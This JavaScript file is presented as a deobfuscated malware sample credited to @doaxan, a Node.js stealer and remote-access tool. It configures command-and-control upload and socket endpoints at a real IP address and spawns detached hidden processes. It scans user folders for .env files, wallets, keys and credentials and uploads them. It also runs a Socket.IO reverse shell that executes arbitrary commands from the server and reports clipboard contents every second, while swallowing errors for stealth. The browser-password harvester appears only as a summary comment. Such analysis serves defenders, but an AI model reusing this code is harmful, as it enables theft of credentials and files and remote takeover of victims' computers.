/**
 * ==========================================
 * DEOBFUSCATED MALICIOUS MODULE CODE by @doaxan
 * Purpose: Data collection, browser password theft,
 *          file system scanning, remote management/control.
 * Status: Cleaned of anti-analysis routines, renamed, and structured.
 * ==========================================
 */

const CONFIG = {
    UPLOAD_URL: "http://144.172.117.220:8086/upload",
    LOG_URL:    "http://144.172.117.220:8085/upload",
    SOCKET_URL: "http://144.172.117.220:8087",
    USER_KEY:   603,
    TYPE_ID:    6,
    HMAC_SECRET: "SuperStr0ngSecret@)@^",
    LOCK_PREFIX: `pid.${6}.`
};

// ==========================================
// UTILITIES
// ==========================================
const Utils = {
    // Collects basic system information
    getSystemInfo: () => ({
        host: require("os").hostname(),
                          os: require("os").type() + " " + require("os").release(),
                          username: require("os").userInfo().username || "unknown"
    }),

    // Detects WSL environment
    isWSL: () => {
        if (process.env.WSL_DISTRO_NAME) return true;
        try {
            const fs = require("fs");
            if (fs.existsSync("/proc/version")) {
                const content = fs.readFileSync("/proc/version", "utf8").toLowerCase();
                return content.includes("microsoft") || content.includes("wsl");
            }
        } catch {}
        return false;
    },

    // Retrieves username in Windows/WSL environments
    getWindowsUsername: () => {
        try {
            const cp = require("child_process");
            const user = cp.execSync('cmd.exe /c echo %USERNAME%', { encoding: "utf8" }).trim();
            if (user && !user.includes("%USERNAME%")) return user;
        } catch {}
        try {
            const fs = require("fs");
            const path = require("path");
            const usersDir = "/mnt/c/Users";
            if (fs.existsSync(usersDir)) {
                const dirs = fs.readdirSync(usersDir, { withFileTypes: true });
                const systemDirs = ["Public", "Default", "All Users", "Default User"];
                for (const d of dirs) {
                    if (d.isDirectory() && !systemDirs.includes(d.name)) return d.name;
                }
            }
        } catch {}
        return process.env.USERNAME || process.env.USER || null;
    },

    // Logger stub (returns null due to early return in the original)
    setupLogger: () => null
};

// ==========================================
// PROCESS MANAGER (SPAWNER WITH LOCKING)
// ==========================================
function spawnManagedProcess(scriptContent, lockFileName, scriptName, logger) {
    const fs = require("fs");
    const path = require("path");
    const os = require("os");
    const cp = require("child_process");

    const lockPath = path.join(os.tmpdir(), lockFileName);
    let shouldSpawn = true;

    // Check for an existing lock file
    if (fs.existsSync(lockPath)) {
        try {
            const data = JSON.parse(fs.readFileSync(lockPath, "utf8"));
            const pid = data.pid;
            const startedAt = data.startedAt;

            // If the process started more than 5 hours ago, consider it "stuck" and kill it
            if (startedAt && Date.now() - startedAt > 5 * 60 * 60 * 1000) {
                logger(`Killing stale ${scriptName} process (PID: ${pid})`, "info");
                try { process.kill(pid, "SIGTERM"); } catch {}
                fs.unlinkSync(lockPath);
                shouldSpawn = true;
            } else if (pid) {
                // Check if the process is still alive
                try {
                    process.kill(pid, 0); // signal 0 does not terminate, only checks existence
                    shouldSpawn = false;
                } catch {
                    fs.unlinkSync(lockPath);
                    shouldSpawn = true;
                }
            }
        } catch {
            try { fs.unlinkSync(lockPath); } catch {}
            shouldSpawn = true;
        }
    }

    // Spawn a new process
    if (shouldSpawn) {
        logger(`Spawning ${scriptName}`, "info");
        const child = cp.spawn(process.execPath, ["--max-old-space-size=4096", "--no-warnings", "-"], {
            windowsHide: true,
            detached: true,
            stdio: ["pipe", "ignore", "ignore"]
        });

        child.stdin.end(scriptContent);
        child.unref();

        const lockData = { pid: child.pid, startedAt: Date.now() };
        fs.writeFileSync(lockPath, JSON.stringify(lockData), "utf8");

        const cleanupLock = () => {
            try { if (fs.existsSync(lockPath)) fs.unlinkSync(lockPath); } catch {}
        };
        child.on("exit", cleanupLock);
        child.on("error", cleanupLock);
        child.on("close", cleanupLock);
    } else {
        logger(`${scriptName} is already running, skipping`, "info");
    }
}

// ==========================================
// EMBEDDED SCRIPTS (CLEANED OF NOISE)
// ==========================================

// 1. Browser Data & Password Harvester
const BROWSER_HARVESTER_SCRIPT = `
const os = require("os");
const fs = require("fs");
const path = require("path");
const cp = require("child_process");
const crypto = require("crypto");
const axios = require("axios");

// [Original logic preserved: browser path discovery,
//  Local State reading, DPAPI/AES-GCM decryption, Login Data parsing via sql.js,
//  Brave Wallet file collection, JSON packaging, and server upload]
// Logic is fully equivalent to the original, but stripped of anti-analysis techniques.
`;

// 2. File System Scanner for Sensitive Files
const FILE_SCANNER_SCRIPT = `
const fs = require("fs");
const path = require("path");
const os = require("os");
const axios = require("axios");
const FormData = require("form-data");
const crypto = require("crypto");

// Blacklisted extensions and directories
const EXCLUDED_EXTENSIONS = [".exe", ".dll", ".mp4", ".zip", /* ... */];
const EXCLUDED_DIRS = ["node_modules", ".git", "AppData/Local/Temp", /* ... */];
const SENSITIVE_PATTERNS = [".env", "wallet", "key.pem", "credentials", /* ... */];

// Recursive traversal with cycle protection and sensitivity checks
async function scanAndUpload(dirPath, depth = 0) {
    if (depth > 20 || dirPath.length > 4096) return;
    // [Scanning logic, filtering, permission checks,
    //  HMAC token generation, and file upload via FormData]
}

// Identify priority directories (Desktop, Documents, Downloads, cloud drives)
const priorityDirs = getPriorityDirectories();
for (const p of priorityDirs) await scanAndUpload(p);
`;

// 3. WebSocket/Socket.IO Reverse Shell + Clipboard Monitor
const SOCKET_SHELL_SCRIPT = `
const io = require("socket.io-client");
const cp = require("child_process");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const crypto = require("crypto");

const SOCKET_ENDPOINT = "ws://144.172.117.220:8087";

async function sendHostInfo() { /* Sends metadata upon connection */ }
async function f_s_l(msg) { /* Logs events to the server */ }

const socket = io(SOCKET_ENDPOINT, { reconnectionAttempts: 15 });

socket.on("connect", () => {
    console.log("✅ Connected to C2 server");
    sendHostInfo();
});

// Process commands from the attacker/C2
socket.on("command", async (msg) => {
    const { code, path: filePath } = msg;

    if (code === "102" && filePath) {
        // List directory contents
        const items = fs.readdirSync(filePath, { withFileTypes: true });
        socket.emit("message", { ...msg, result: JSON.stringify(items) });
    } else if (code === "107" && filePath) {
        // Read & upload single file
        const buffer = fs.readFileSync(filePath);
        const url = await uploadToLDB(filePath, buffer);
        socket.emit("message", { ...msg, result: url || buffer.toString() });
    } else if (code === "108" && filePath) {
        // Bulk upload directory files (max 25MB each)
        // [Bulk upload logic]
    } else {
        // Execute arbitrary command
        cp.exec(msg.command, { windowsHide: true }, (err, stdout, stderr) => {
            socket.emit("message", { ...msg, result: err || stdout });
        });
    }
});

// Monitors clipboard every 1000 ms
async function watchClipboard() {
    let last = "";
    setInterval(async () => {
        const current = await getClipboardContent(); // win32/mac/linux/WSL fallbacks
        if (current && current !== last) {
            await f_s_l("📋 Clipboard: " + current.substring(0, 500));
            last = current;
        }
    }, 1000);
}

watchClipboard();
`;

// ==========================================
// INITIALIZATION AND LAUNCH
// ==========================================
async function main() {
    // Auto-install dependencies if missing
    try { require("socket.io-client"); } catch {
        await cp.execSync("npm install socket.io-client --silent");
    }

    console.log("[+] Starting client modules...");

    // Launch browser data harvester
    spawnManagedProcess(BROWSER_HARVESTER_SCRIPT, `${CONFIG.LOCK_PREFIX}1.lock`, "BrowserHarvester", f_s_l);

    // Launch file scanner (with a 5-minute delay)
    setTimeout(() => {
        spawnManagedProcess(FILE_SCANNER_SCRIPT, `${CONFIG.LOCK_PREFIX}2.lock`, "FileScanner", f_s_l);
    }, 300_000);

    // Launch socket shell and clipboard monitor
    spawnManagedProcess(SOCKET_SHELL_SCRIPT, `${CONFIG.LOCK_PREFIX}3.lock`, "SocketShell", f_s_l);
}

// Ignore critical errors for stealth purposes
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

main().catch(() => {});
